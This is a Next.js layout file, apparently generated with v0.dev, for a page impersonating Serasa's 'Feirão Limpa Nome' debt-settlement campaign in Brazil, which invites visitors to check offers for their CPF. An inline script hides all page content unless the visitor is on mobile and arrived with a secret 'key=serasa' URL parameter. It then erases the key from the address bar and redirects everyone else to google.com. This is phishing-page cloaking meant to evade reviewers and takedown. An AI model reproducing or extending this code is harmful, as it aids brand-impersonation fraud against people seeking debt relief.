import type React from "react"
import type { Metadata } from "next"
import { Inter } from "next/font/google"
import "./globals.css"

const inter = Inter({ subsets: ["latin"] })

export const metadata: Metadata = {
  title: "Feirão Limpa Nome - Serasa",
  description: "Consulte grátis as ofertas disponíveis para regularizar seu CPF no Feirão Limpa Nome da Serasa",
    generator: 'v0.dev'
}

export default function RootLayout({
  children,
}: {
  children: React.ReactNode
}) {
  return (
    <html lang="pt-BR">
      <head>
        <script
          dangerouslySetInnerHTML={{
            __html: `
              (function () {
                const url = window.location.href;
                const chave = 'serasa'; // ✅ sua keyword aqui
                const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
                const urlTemChave = url.includes(\`key=\${chave}\`);
                if (isMobile && urlTemChave) {
                  // 🔄 Remove a keyword da URL
                  const novaUrl = window.location.origin + window.location.pathname;
                  window.history.replaceState({}, document.title, novaUrl);
                  // ✅ Mostra conteúdo real
                  window.addEventListener('DOMContentLoaded', () => {
                    const conteudo = document.getElementById('conteudo');
                    if (conteudo) {
                      conteudo.style.display = 'block';
                    }
                  });
                } else {
                  // ❌ Não autorizado — redireciona ou bloqueia
                  window.location.href = 'https://www.google.com';
                }
              })();
            `,
          }}
        />
      </head>
      <body className={inter.className}>
        <div id="conteudo" style={{ display: "none" }}>
          {children}
        </div>
      </body>
    </html>
  )
}
